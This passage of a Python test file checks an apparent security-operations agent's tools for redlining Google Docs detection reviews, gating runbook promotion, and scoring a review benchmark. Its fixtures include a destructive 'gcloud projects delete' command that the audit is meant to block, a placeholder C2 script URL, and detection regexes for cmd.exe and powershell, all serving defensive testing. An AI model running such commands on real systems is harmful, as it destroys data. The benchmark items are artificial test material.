        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res1["status"] == "success"
    assert res1["finding_count"] == 7
    assert res1["coverage_matrix"]["total_tdo_count"] == 5
    assert res1["coverage_matrix"]["covered_tdo_count"] == 2
    assert res1["coverage_matrix"]["uncovered_tdo_count"] == 3
    assert res1["coverage_matrix"]["coverage_percentage"] == 40.0
    assert len(res1["siem_tdo_results"]) == 3
    assert all(r["compiler_verified"] is True for r in res1["siem_tdo_results"].values())
    assert all(r["retrohunt_event_count"] == 3 for r in res1["siem_tdo_results"].values())
    assert res1["comments"]["inserted_count"] == 7
    assert res1["edits"]["applied_count"] == 7
    assert len(batch_calls) == 2

    comment_bodies = [
        req["insertComment"]["content"] for req in batch_calls[0]["requests"]
    ]
    assert any(
        "[Chronicle SIEM Verified: validate_rule=SUCCESS" in body
        for body in comment_bodies
    )

    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Simulate accepting all 7 edits on doc_text and verify 100% TDO coverage
    accepted_text = doc_text
    for f in sorted(res1["findings"], key=lambda item: item["start_index"], reverse=True):
        s_pos = f["start_index"] - 1
        e_pos = f["end_index"] - 1
        accepted_text = accepted_text[:s_pos] + f["replacement"] + accepted_text[e_pos:]
    post_matrix = build_detection_coverage_gap_matrix(accepted_text)
    assert post_matrix["total_tdo_count"] == 5
    assert post_matrix["covered_tdo_count"] == 5
    assert post_matrix["uncovered_tdo_count"] == 0
    assert post_matrix["coverage_percentage"] == 100.0

    # Pass 2 idempotency when suggestions are already pending
    mock_doc_pass2 = {
        "documentId": "doc-h8-e2e",
        "title": "Cycle 17 H8 E2E Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": ["suggest.h8.existing"],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    res2 = analyze_and_redline_detection_coverage_gaps_in_doc(
        "doc-h8-e2e",
        run_live_siem_check=True,
        synthesize_missing_tdo_rules=True,
        siem_validate_fn=fake_validate,
        siem_search_fn=fake_search,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(
            lambda req: httpx.Response(200, json=mock_doc_pass2)
        ),
    )
    assert res2["finding_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 7
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0

    # Verify ADK FunctionTool schema declaration
    ft = FunctionTool(
        tools_module.analyze_and_redline_detection_coverage_gaps_in_doc
    )
    decl = ft._get_declaration()
    assert decl.name == "analyze_and_redline_detection_coverage_gaps_in_doc"
    props = (decl.parameters_json_schema or {}).get("properties", {})
    assert "document_id" in props
    assert "run_live_siem_check" in props
    assert "synthesize_missing_tdo_rules" in props
    assert "tool_context" not in props


def test_review_google_doc_with_stage_a_includes_tdo_coverage_stage_a() -> None:
    """Verifies that review_google_doc_with_stage_a(..., include_tdo_coverage_stage_a=True)
    populates stage_a_tdo_coverage_count without overlapping spans."""
    import json
    import httpx
    from skills.drive_registry import StaticTokenSource
    from manager.tools.docs_review_tools import review_google_doc_with_stage_a

    doc_text = (
        "# Detection Coverage Review (SOAR Case 33278)\n"
        "Executive Summary: We have achieved 100% detection coverage across all campaign techniques.\n"
        "- TDO-GCP-CLOUDSQL-DELETE (MITRE T1485): Log Source: AWS_CLOUDTRAIL | Action Item: Write YARA-L 2.0 rule for cloudsql.instances.delete.\n\n"
        "rule tdo_gcp_iam_setiampolicy_case_33278 {\n"
        "  meta:\n"
        '    author = "SecOps Autonomous Agent"\n'
        '    mitre_attack_technique = "T1098.003"\n'
        '    runbook_skill = "compromised-user-account-response"\n'
        "  events:\n"
        '    $e.metadata.log_type = "GCP_CLOUDAUDIT"\n'
        '    $e.metadata.product_event_type = "SetIamPolicy"\n'
        '    $e.target.resource.name = "projects/base-production"\n'
        '    $e.principal.ip = "104.198.226.161"\n'
        "  condition:\n"
        "    $e\n"
        "}\n"
    )
    mock_doc = {
        "documentId": "doc-h8-stage-a",
        "title": "Cycle 17 H8 Stage A Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {"content": doc_text},
                            }
                        ]
                    }
                }
            ]
        },
    }

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        reqs = payload.get("requests", [])
        return httpx.Response(200, json={"replies": [{} for _ in reqs]})

    res = review_google_doc_with_stage_a(
        "doc-h8-stage-a",
        include_tdo_coverage_stage_a=True,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    assert res["stage_a_tdo_coverage_count"] == 3
    assert res["edits"]["applied_count"] == 3


# ==============================================================================
# Cycle 18 (H7): Closed-Loop WikiSkill + RRSI Runbook Promotion Gate Tests
# ==============================================================================


def test_find_runbook_promotion_readiness_spans_parameterizes_case_iocs_and_folds_overlaps() -> None:
    """Verifies that find_runbook_promotion_readiness_spans detects case-specific IoCs,
    case-coupled headings, missing zero-hit fallback guidance (folding inner IoCs
    so spans never overlap), and missing Runbook Purpose & Promotion Contract sections,
    while ignoring literals inside YARA-L 2.0 rules and provenance notes."""
    from manager.tools.docs_review_tools import (
        find_runbook_promotion_readiness_spans,
        audit_runbook_promotion_readiness,
    )

    doc_text = (
        "# Compromised User Account Response Runbook\n"
        "> Provenance note: Lessons learned promoted from SOAR Case 33278 (104.198.226.161).\n\n"
        "## 1. Initial Triage (SOAR Case 33278)\n"
        "- Pivot on `principal.ip = \"104.198.226.161\"` and `principal.hostname = \"wins-d19\"` in Chronicle SIEM.\n"
        "- Inspect IAM bindings for `hello@base-production.iam.gserviceaccount.com` and `admin@mydomain.com`.\n"
        "- Check lateral movement for user `lisawalker` and Cloud SQL instance `projects/base-analytics/instances/prod-customers`.\n\n"
        "## 2. Containment & Remediation\n"
        "- Revoke active OAuth tokens and disable compromised credentials (`--dry-run` first).\n\n"
        "rule case_33278_setiampolicy {\n"
        "  meta:\n"
        '    author = "SecOps Agent"\n'
        "  events:\n"
        '    $e.principal.ip = "104.198.226.161"\n'
        "  condition:\n"
        "    $e\n"
        "}\n"
    )
    _, _, findings = find_runbook_promotion_readiness_spans(
        doc_text,
        skill_name="compromised-user-account-response",
        require_purpose_contract=True,
        require_fallback_guidance=True,
    )
    subtypes = [f["subtype"] for f in findings]
    assert "case_coupled_heading" in subtypes
    assert "case_specific_ioc_leakage" in subtypes
    assert "missing_udm_zero_hit_fallback" in subtypes
    assert "missing_runbook_purpose_contract" in subtypes

    # Verify strict non-overlapping UTF-16 spans
    sorted_spans = sorted(findings, key=lambda item: (item["start_index"], item["end_index"]))
    for i in range(len(sorted_spans) - 1):
        assert sorted_spans[i]["end_index"] <= sorted_spans[i + 1]["start_index"], (
            f"Overlapping spans: {sorted_spans[i]} vs {sorted_spans[i + 1]}"
        )

    # Verify the UDM line with 104.198.226.161 and wins-d19 had its inner IoCs folded
    # into the missing_udm_zero_hit_fallback replacement
    fallback_finding = next(
        f for f in findings if f["subtype"] == "missing_udm_zero_hit_fallback"
    )
    assert "<PRINCIPAL_IP>" in fallback_finding["replacement"]
    assert "<PRINCIPAL_HOSTNAME>" in fallback_finding["replacement"]
    assert "Fallback (Zero-Hit Recovery)" in fallback_finding["replacement"]

    # Simulate accepting all suggested edits in descending start_index order
    repaired_text = doc_text
    for f in sorted(findings, key=lambda item: item["start_index"], reverse=True):
        s_pos = f["start_index"] - 1
        e_pos = f["end_index"] - 1
        assert repaired_text[s_pos:e_pos] == f["matched_text"]
        repaired_text = repaired_text[:s_pos] + f["replacement"] + repaired_text[e_pos:]

    # After applying all suggested edits, audit_runbook_promotion_readiness should pass
    post_audit = audit_runbook_promotion_readiness(
        repaired_text,
        skill_name="compromised-user-account-response",
    )
    assert post_audit["promotion_ready"] is True
    assert post_audit["blocking_reasons"] == []
    assert post_audit["case_specific_ioc_count"] == 0
    assert post_audit["has_purpose_contract"] is True
    assert post_audit["missing_fallback_count"] == 0


def test_audit_runbook_promotion_readiness_enforces_slow_update_invariants_and_l1_budget() -> None:
    """Verifies that audit_runbook_promotion_readiness enforces protected slow-update
    headings, destructive CLI safety invariants, L1 edit-budget regularization, and
    RRSI validation noise-floor gating (Delta S_penalized >= tau_accept and HDA)."""
    from manager.tools.docs_review_tools import audit_runbook_promotion_readiness

    baseline_md = (
        "# Compromised User Account Response Runbook\n\n"
        "## Runbook Purpose & Promotion Contract (WikiSkill / RRSI)\n"
        "- **Purpose**: Reusable SOP.\n"
        "- **Input Parameters**: `<PRINCIPAL_IP>`\n\n"
        "## 1. Initial Triage\n"
        "- Query `principal.ip = \"<PRINCIPAL_IP>\"`.\n"
        "  - **Fallback (Zero-Hit Recovery)**: Broaden search.\n\n"
        "## 2. Containment & Remediation\n"
        "- Revoke sessions with `--dry-run` first.\n"
    )
    # Candidate that deletes "## 2. Containment & Remediation" and adds a destructive CLI command
    bad_candidate_md = (
        "# Compromised User Account Response Runbook\n\n"
        "## Runbook Purpose & Promotion Contract (WikiSkill / RRSI)\n"
        "- **Purpose**: Reusable SOP.\n"
        "- **Input Parameters**: `<PRINCIPAL_IP>`\n\n"
        "## 1. Initial Triage\n"
        "- Query `principal.ip = \"<PRINCIPAL_IP>\"`.\n"
        "  - **Fallback (Zero-Hit Recovery)**: Broaden search.\n"
        "- Run `gcloud projects delete prod-project --quiet` immediately.\n"
    )
    audit_bad = audit_runbook_promotion_readiness(
        bad_candidate_md,
        baseline_markdown=baseline_md,
        skill_name="compromised-user-account-response",
        max_l1_churn_ratio=0.10,
        validation_score_delta=0.008,  # Below tau_accept = 0.015
        hda_attribution={"delta_G": -0.02, "delta_T": 0.03, "delta_A": -0.002},
        tau_accept=0.015,
    )
    assert audit_bad["promotion_ready"] is False
    assert "Containment & Remediation" in audit_bad["missing_protected_headings"]
    assert audit_bad["destructive_cli_count"] >= 1
    assert audit_bad["l1_budget_passed"] is False
    assert audit_bad["validation_gate_passed"] is False
    assert audit_bad["hda_Decomposition"]["delta_total"] == 0.008
    assert any("missing_protected_headings" in r for r in audit_bad["blocking_reasons"])
    assert any("unsafe_telemetry_or_destructive_cli" in r for r in audit_bad["blocking_reasons"])
    assert any("l1_edit_budget_exceeded" in r for r in audit_bad["blocking_reasons"])
    assert any("validation_below_noise_floor" in r for r in audit_bad["blocking_reasons"])
    assert any("hda_grounding_regression" in r for r in audit_bad["blocking_reasons"])


def test_export_accepted_doc_to_markdown_rrsi_promotion_gate_blocks_and_rolls_back(
    tmp_path,
) -> None:
    """Verifies that export_accepted_doc_to_markdown(..., enforce_rrsi_promotion_gate=True)
    blocks promotion and returns rollback_markdown + logs REJECTED_ROLLBACK to skill-impact.md
    when case-specific IoCs remain, and promotes + logs PROMOTED when all gates pass."""
    import httpx
    from skills.drive_registry import StaticTokenSource
    from manager.tools.docs_review_tools import export_accepted_doc_to_markdown

    ledger_file = tmp_path / "skill-impact.md"
    output_file = tmp_path / "compromised-user-account-response.md"

    # 1. Unparameterized doc that fails the RRSI promotion gate
    unready_text = (
        "# Compromised User Account Response Runbook\n\n"
        "## 1. Initial Triage (SOAR Case 33278)\n"
        "- Pivot on `principal.ip = \"104.198.226.161\"` in Chronicle SIEM.\n\n"
        "## 2. Containment & Remediation\n"
        "- Disable user account.\n"
    )
    mock_unready_doc = {
        "documentId": "doc-rrsi-block",
        "title": "Unready Runbook Draft",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(unready_text) + 1,
                                "textRun": {"content": unready_text},
                            }
                        ]
                    }
                }
            ]
        },
    }
    res_blocked = export_accepted_doc_to_markdown(
        "doc-rrsi-block",
        skill_name="compromised-user-account-response",
        enforce_rrsi_promotion_gate=True,
        validation_score_delta=0.025,
        skill_impact_ledger_path=str(ledger_file),
        output_path=str(output_file),
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(
            lambda req: httpx.Response(200, json=mock_unready_doc)
        ),
    )
    assert res_blocked["status"] == "blocked_rrsi_promotion_gate"
    assert res_blocked["promotion_audit"]["promotion_ready"] is False
    assert res_blocked["rollback_markdown"] is not None
    assert not output_file.exists()
    assert ledger_file.exists()
    ledger_text = ledger_file.read_text(encoding="utf-8")
    assert "REJECTED_ROLLBACK" in ledger_text

    # 2. Parameterized doc that passes the RRSI promotion gate
    ready_text = (
        "# Compromised User Account Response Runbook\n\n"
        "## Runbook Purpose & Promotion Contract (WikiSkill / RRSI)\n"
        "- **Purpose**: Reusable SOP.\n"
        "- **Input Parameters**: `<PRINCIPAL_IP>`, `<TARGET_USER>`\n\n"
        "## 1. Initial Triage\n"
        "- Pivot on `principal.ip = \"<PRINCIPAL_IP>\"` in Chronicle SIEM.\n"
        "  - **Fallback (Zero-Hit Recovery)**: Broaden UDM search.\n\n"
        "## 2. Containment & Remediation\n"
        "- Disable `<TARGET_USER>` account after `--dry-run` verification.\n"
    )
    mock_ready_doc = {
        "documentId": "doc-rrsi-pass",
        "title": "Ready Runbook Draft",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(ready_text) + 1,
                                "textRun": {"content": ready_text},
                            }
                        ]
                    }
                }
            ]
        },
    }
    res_passed = export_accepted_doc_to_markdown(
        "doc-rrsi-pass",
        skill_name="compromised-user-account-response",
        baseline_markdown=ready_text,
        enforce_rrsi_promotion_gate=True,
        max_l1_churn_ratio=1.0,
        validation_score_delta=0.042,
        skill_impact_ledger_path=str(ledger_file),
        output_path=str(output_file),
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(
            lambda req: httpx.Response(200, json=mock_ready_doc)
        ),
    )
    assert res_passed["status"] == "success"
    assert res_passed["promotion_audit"]["promotion_ready"] is True
    assert output_file.exists()
    ledger_text_after = ledger_file.read_text(encoding="utf-8")
    assert "PROMOTED" in ledger_text_after


def test_audit_and_redline_runbook_promotion_in_doc_end_to_end_and_idempotency(
    tmp_path,
) -> None:
    """Verifies audit_and_redline_runbook_promotion_in_doc against a mocked Google Docs
    API v1 transport, checking descending startIndex ordering, post-redline promotion
    readiness, skill-impact.md ledger logging, Pass 2 idempotency, and ADK FunctionTool
    schema declaration."""
    import json
    import httpx
    from google.adk.tools.function_tool import FunctionTool
    from skills.drive_registry import StaticTokenSource
    from manager.tools.docs_review_tools import audit_and_redline_runbook_promotion_in_doc
    from manager.tools import tools as tools_module

    doc_text = (
        "# Compromised User Account Response Runbook\n\n"
        "## 1. Initial Triage (SOAR Case 33278)\n"
        "- Pivot on `principal.ip = \"104.198.226.161\"` and `principal.hostname = \"wins-d19\"` in Chronicle SIEM.\n"
        "- Inspect service account `hello@base-production.iam.gserviceaccount.com`.\n\n"
        "## 2. Containment & Remediation\n"
        "- Revoke OAuth tokens for `admin@mydomain.com` (`--dry-run` first).\n"
    )
    mock_doc = {
        "documentId": "doc-h7-e2e",
        "title": "Cycle 18 H7 E2E Runbook Draft",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {"content": doc_text},
                            }
                        ]
                    }
                }
            ]
        },
    }
    batch_calls: list[dict] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        batch_calls.append(payload)
        reqs = payload.get("requests", [])
        if reqs and "insertComment" in reqs[0]:
            return httpx.Response(
                200,
                json={
                    "replies": [
                        {"insertComment": {"commentId": f"c-h7-{i+1}"}}
                        for i in range(len(reqs))
                    ]
                },
            )
        return httpx.Response(200, json={"replies": [{} for _ in reqs]})

    ledger_path = tmp_path / "skill-impact.md"
    res1 = audit_and_redline_runbook_promotion_in_doc(
        "doc-h7-e2e",
        skill_name="compromised-user-account-response",
        max_l1_churn_ratio=1.0,
        validation_score_delta=0.035,
        skill_impact_ledger_path=str(ledger_path),
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res1["status"] == "success"
    assert res1["promotion_findings_count"] == 5
    assert res1["pre_redline_audit"]["promotion_ready"] is False
    assert res1["post_redline_audit"]["promotion_ready"] is True
    assert res1["promotion_ready_after_redline"] is True
    assert res1["comments"]["inserted_count"] == 5
    assert res1["edits"]["applied_count"] == 5
    assert ledger_path.exists()
    assert "PROMOTED" in ledger_path.read_text(encoding="utf-8")

    delete_starts = [
        req["deleteContentRange"]["range"]["startIndex"]
        for req in batch_calls[1]["requests"]
        if "deleteContentRange" in req
    ]
    assert delete_starts == sorted(delete_starts, reverse=True)

    # Pass 2 idempotency when suggestions are already pending
    mock_doc_pass2 = {
        "documentId": "doc-h7-e2e",
        "title": "Cycle 18 H7 E2E Runbook Draft",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {
                                    "content": doc_text,
                                    "suggestedDeletionIds": ["suggest.h7.existing"],
                                },
                            }
                        ]
                    }
                }
            ]
        },
    }
    res2 = audit_and_redline_runbook_promotion_in_doc(
        "doc-h7-e2e",
        skill_name="compromised-user-account-response",
        max_l1_churn_ratio=1.0,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(
            lambda req: httpx.Response(200, json=mock_doc_pass2)
        ),
    )
    assert res2["promotion_findings_count"] == 0
    assert res2["skipped_existing_suggestion_count"] == 5
    assert res2["comments"]["inserted_count"] == 0
    assert res2["edits"]["applied_count"] == 0

    # Verify ADK FunctionTool schema declaration
    ft = FunctionTool(tools_module.audit_and_redline_runbook_promotion_in_doc)
    decl = ft._get_declaration()
    assert decl.name == "audit_and_redline_runbook_promotion_in_doc"
    props = (decl.parameters_json_schema or {}).get("properties", {})
    assert "document_id" in props
    assert "skill_name" in props
    assert "max_l1_churn_ratio" in props
    assert "validation_score_delta" in props
    assert "tool_context" not in props


def test_review_google_doc_with_stage_a_includes_runbook_promotion_stage_a() -> None:
    """Verifies that review_google_doc_with_stage_a(..., include_runbook_promotion_stage_a=True)
    populates stage_a_runbook_promotion_count without overlapping spans."""
    import json
    import httpx
    from skills.drive_registry import StaticTokenSource
    from manager.tools.docs_review_tools import review_google_doc_with_stage_a

    doc_text = (
        "# Compromised User Account Response Runbook\n\n"
        "## 1. Initial Triage (SOAR Case 33278)\n"
        "- Pivot on `principal.ip = \"104.198.226.161\"` in Chronicle SIEM.\n\n"
        "## 2. Containment & Remediation\n"
        "- Revoke sessions for `admin@mydomain.com`.\n"
    )
    mock_doc = {
        "documentId": "doc-h7-stage-a",
        "title": "Cycle 18 H7 Stage A Test",
        "body": {
            "content": [
                {
                    "paragraph": {
                        "elements": [
                            {
                                "startIndex": 1,
                                "endIndex": len(doc_text) + 1,
                                "textRun": {"content": doc_text},
                            }
                        ]
                    }
                }
            ]
        },
    }

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, json=mock_doc)
        payload = json.loads(request.content.decode("utf-8"))
        reqs = payload.get("requests", [])
        return httpx.Response(200, json={"replies": [{} for _ in reqs]})

    res = review_google_doc_with_stage_a(
        "doc-h7-stage-a",
        include_runbook_promotion_stage_a=True,
        token_source=StaticTokenSource("adc-token"),
        transport=httpx.MockTransport(handler),
    )
    assert res["status"] == "success"
    assert res["stage_a_runbook_promotion_count"] == 4
    assert res["edits"]["applied_count"] == 4


# ---------------------------------------------------------------------------
# Cycle 19 (H20): Stateful Local Google Docs Kix AST Simulator & Quantitative
# Grounded Review Benchmark with HDA Attribution
# ---------------------------------------------------------------------------


def test_local_google_docs_simulator_drive_markdown_import_ast_and_italic_regex() -> None:
    """H20 Suite 1: Verifies that LocalGoogleDocsSimulator.create_or_reset_doc(...,
    simulate_drive_markdown_import=True) produces accurate 1-based UTF-16
    startIndex/endIndex coordinates, HEADING_1..6 styles, paragraph.bullet lists,
    Markdown tables, collapsed YAML frontmatter, and textStyle.italic=True stripped
    regex wildcards (/.cmd./), and that reconstruct_markdown_from_doc_ast and
    find_italic_corrupted_regex_spans recover them losslessly."""
    from manager.tools.docs_review_tools import (
        LocalGoogleDocsSimulator,
        _extract_text_and_index_map,
        find_italic_corrupted_regex_spans,
        reconstruct_markdown_from_doc_ast,
    )

    md_text = (
        "---\n"
        "name: compromised-user-account-response\n"
        "description: Standardized cloud account containment runbook.\n"
        "---\n\n"
        "# Phase 1: Triage & Telemetry\n"
        "## Step 1.1: UDM Hunting\n"
        "- Execute UDM query: `target.process.command_line = /.*cmd\\.exe.*/ nocase`\n"
        "- Verify source host\n"
        "1. First ordered action\n"
        "2. Second ordered action\n\n"
        "| Entity | Role |\n"
        "| --- | --- |\n"
        "| wins-d19 | Compromised Host |\n"
    )
    sim = LocalGoogleDocsSimulator()
    doc = sim.create_or_reset_doc(
        "doc-sim-import",
        "Simulated Drive Import",
        md_text,
        simulate_drive_markdown_import=True,
    )
    plain, idx_map = _extract_text_and_index_map(doc)
    assert len(plain) == len(idx_map)
    assert idx_map[0] == 1
    # Collapsed YAML frontmatter on line 1 (no --- delimiters)
    assert plain.startswith(
        "name: compromised-user-account-response description: Standardized cloud account containment runbook.\n"
    )
    # Paired *...* inside /.*cmd\.exe.*/ was stripped into italic /.cmd\.exe./
    assert "/.cmd\\.exe./" in plain

    comments, edits, findings = find_italic_corrupted_regex_spans(doc)
    assert len(findings) == 1
    assert findings[0]["defect_type"] == "italic_corrupted_regex_wildcard"
    assert findings[0]["quote"] == "/.cmd\\.exe./"
    assert findings[0]["replacement"] == "/.*cmd\\.exe.*/"
    assert edits[0]["quote"] == "/.cmd\\.exe./"
    assert edits[0]["replacement"] == "/.*cmd\\.exe.*/"

    recon = reconstruct_markdown_from_doc_ast(doc)
    assert recon["headings_reconstructed_count"] == 2
    assert recon["list_items_reconstructed_count"] == 4
    assert recon["tables_reconstructed_count"] == 1
    assert recon["italic_regex_wildcards_recovered_count"] == 1
    assert "# Phase 1: Triage & Telemetry" in recon["markdown"]
    assert "## Step 1.1: UDM Hunting" in recon["markdown"]
    assert "/.*cmd\\.exe.*/" in recon["markdown"]
    assert "| wins-d19 | Compromised Host |" in recon["markdown"]


def test_local_google_docs_simulator_stateful_suggest_edits_and_multi_pass_idempotency() -> None:
    """H20 Suite 2: Verifies that running review_google_doc_with_stage_a against
    simulator.as_httpx_transport() mutates the simulator's Kix AST in place with
    paired suggestedDeletionIds and suggestedInsertionIds textRuns,
    inspect_doc_suggestions extracts exact baseline_text, accepted_text, and unified
    diff, and a second pass of review_google_doc_with_stage_a skips all pending
    suggestions (skipped_existing_suggestion_count > 0, applied_count == 0)."""
    from skills.drive_registry import StaticTokenSource
    from manager.tools.docs_review_tools import (
        LocalGoogleDocsSimulator,
        clear_doc_index_cache,
        inspect_doc_suggestions,
        review_google_doc_with_stage_a,
    )

    clear_doc_index_cache()
    sim = LocalGoogleDocsSimulator()
    transport = sim.as_httpx_transport()
    token_source = StaticTokenSource("sim-token")

    doc_md = (
        "# Incident Review Draft\n"
        "- C2 URL: https://evil-c2.example.org/stage2.ps1\n"
        '- UDM query: `ip = "104.198.226.161" AND target.process.command_line = /.*powershell.*/ nocase`\n'
    )
    sim.create_or_reset_doc(
        "doc-sim-stateful",
        "Stateful Suggest Test",
        doc_md,
        simulate_drive_markdown_import=True,
    )

    pass1 = review_google_doc_with_stage_a(
        "doc-sim-stateful",
        token_source=token_source,
        transport=transport,
    )
    assert pass1["status"] == "success"
    assert pass1["stage_a_url_count"] == 1
    assert pass1["stage_a_udm_count"] == 2
    assert pass1["stage_a_italic_regex_count"] == 1
    assert pass1["edits"]["applied_count"] == 3
    assert pass1["comments"]["inserted_count"] == 3

    inspected = inspect_doc_suggestions(
        "doc-sim-stateful",
        token_source=token_source,
        transport=transport,
    )
    assert inspected["suggestion_count"] == 3
    assert "https://evil-c2.example.org/stage2.ps1" in inspected["baseline_text"]
    assert "hxxps://evil-c2[.]example[.]org/stage2.ps1" in inspected["accepted_text"]
    assert "principal.ip" in inspected["accepted_text"]
    assert "/.*powershell.*/" in inspected["accepted_text"]
    assert "(baseline)" in inspected["unified_diff"]

    # Pass 2 against the same stateful simulator document must be 100% idempotent
    pass2 = review_google_doc_with_stage_a(
        "doc-sim-stateful",
        token_source=token_source,
        transport=transport,
    )
    assert pass2["status"] == "success"
    assert pass2["edits"]["applied_count"] == 0
    assert pass2["comments"]["inserted_count"] == 0
    assert pass2["skipped_existing_suggestion_count"] == 3


def test_local_google_docs_simulator_comments_lifecycle_and_export_gate() -> None:
    """H20 Suite 3: Verifies that insert_doc_comments populates stateful Kix comments
    in LocalGoogleDocsSimulator, list_doc_comments returns unresolved_comment_count > 0,
    export_accepted_doc_to_markdown(..., require_resolved_comments=True) blocks until
    simulator.resolve_comment(...) is called, and then exports valid Markdown."""
    from skills.drive_registry import StaticTokenSource
    from manager.tools.docs_review_tools import (
        LocalGoogleDocsSimulator,
        clear_doc_index_cache,
        export_accepted_doc_to_markdown,
        list_doc_comments,
        review_google_doc_with_stage_a,
    )

    clear_doc_index_cache()
    sim = LocalGoogleDocsSimulator()
    transport = sim.as_httpx_transport()
    token_source = StaticTokenSource("sim-token")

    sim.create_or_reset_doc(
        "doc-sim-comments",
        "Comments Lifecycle Test",
        "# Triage Steps\n- Query `ip = \"104.198.226.161\"`\n",
        simulate_drive_markdown_import=True,
    )
    rev = review_google_doc_with_stage_a(
        "doc-sim-comments",
        token_source=token_source,
        transport=transport,
    )
    assert rev["comments"]["inserted_count"] == 1
    assert rev["edits"]["applied_count"] == 1

    listed = list_doc_comments(
        "doc-sim-comments",
        token_source=token_source,
        transport=transport,
    )
    assert listed["status"] == "success"
    assert listed["unresolved_comment_count"] == 1
    assert listed["resolved_comment_count"] == 0
    comment_id = listed["unresolved_comments"][0]["id"]

    blocked = export_accepted_doc_to_markdown(
        "doc-sim-comments",
        require_resolved_comments=True,
        publish_to_drive=False,
        token_source=token_source,
        transport=transport,
    )
    assert blocked["status"] == "blocked_unresolved_comments"
    assert blocked["unresolved_comment_count"] == 1

    sim.resolve_comment("doc-sim-comments", comment_id)
    exported = export_accepted_doc_to_markdown(
        "doc-sim-comments",
        require_resolved_comments=True,
        publish_to_drive=False,
        token_source=token_source,
        transport=transport,
    )
    assert exported["status"] == "success"
    assert exported["unresolved_comment_count"] == 0
    assert exported["resolved_comment_count"] == 1
    assert "# Triage Steps" in exported["accepted_markdown"]
    assert 'principal.ip = "104.198.226.161"' in exported["accepted_markdown"]


def test_evaluate_infosec_doc_reviewer_all_scenarios_precision_recall_and_idempotency(
    tmp_path,
) -> None:
    """H20 Suite 4: Executes evaluate_infosec_doc_reviewer across all 6 seeded
    scenarios (BENCH-01 through BENCH-06) and verifies span_precision == 1.0,
    defect_recall == 1.0, false_positive_rate == 0.0, safety_refusal_rate == 0.0,
    and pass2_idempotency_rate == 1.0."""
    from manager.tools.docs_review_tools import evaluate_infosec_doc_reviewer

    report_path = tmp_path / "h20_benchmark_scorecard.md"
    res = evaluate_infosec_doc_reviewer(
        scenario_ids="all",
        include_hda_ablation=True,
        output_report_path=str(report_path),
    )
    assert res["status"] == "success"
    assert res["scenario_count"] == 6
    assert res["total_expected_defects"] == 32
    assert res["true_positive_edits"] == 32
    assert res["false_positive_edits"] == 0
    assert res["false_negative_defects"] == 0
    assert res["span_precision"] == 1.0
    assert res["defect_recall"] == 1.0
    assert res["f1_score"] == 1.0
    assert res["false_positive_rate"] == 0.0
    assert res["safety_refusal_rate"] == 0.0
    assert res["safety_hazard_catch_rate"] == 1.0
    assert res["pass2_idempotency_rate"] == 1.0
    assert res["negative_controls_preserved"] == res["total_negative_controls"]
    assert report_path.exists()
    assert "BENCH-01-UDM-AND-ITALIC-WILDCARD" in report_path.read_text(encoding="utf-8")


def test_evaluate_infosec_doc_reviewer_hda_attribution_and_adk_tool_schema() -> None:
    """H20 Suite 5: Verifies 4-way Harness-Delta Attribution (Delta_G, Delta_T,
    Delta_A, Delta_total), verifies integration with audit_runbook_promotion_readiness,
    and validates the ADK FunctionTool declaration for evaluate_infosec_doc_reviewer."""
    from google.adk.tools.function_tool import FunctionTool
    from manager.tools.docs_review_tools import evaluate_infosec_doc_reviewer
    from manager.tools import tools as tools_module

    res = evaluate_infosec_doc_reviewer(
        scenario_ids="all",
        include_hda_ablation=True,
    )
    hda = res["hda_attribution"]
    assert hda["delta_T"] > 0.0
    assert hda["delta_G"] > 0.0
    assert hda["delta_A"] > 0.0
    assert round(hda["delta_T"] + hda["delta_G"] + hda["delta_A"], 4) == hda["delta_total"]
    assert hda["delta_total"] == 1.0

    gate = res["rrsi_promotion_gate_check"]
    assert gate["generalized_runbook_promotion_ready"] is True
    assert gate["generalized_runbook_decision"] == "PROMOTED"
    assert gate["overfitted_control_promotion_ready"] is False
    assert gate["overfitted_control_decision"] == "REJECTED_ROLLBACK"

    ft = FunctionTool(tools_module.evaluate_infosec_doc_reviewer)
    decl = ft._get_declaration()
    assert decl.name == "evaluate_infosec_doc_reviewer"
    props = (decl.parameters_json_schema or {}).get("properties", {})
    assert "scenario_ids" in props
    assert "include_hda_ablation" in props
    assert "output_report_path" in props


def test_find_waved_ontology_spans_extracts_cwe_cve_attack_d3fend() -> None:
    """H21 Suite 1: Verifies extraction and UTF-16 startIndex/endIndex calculation
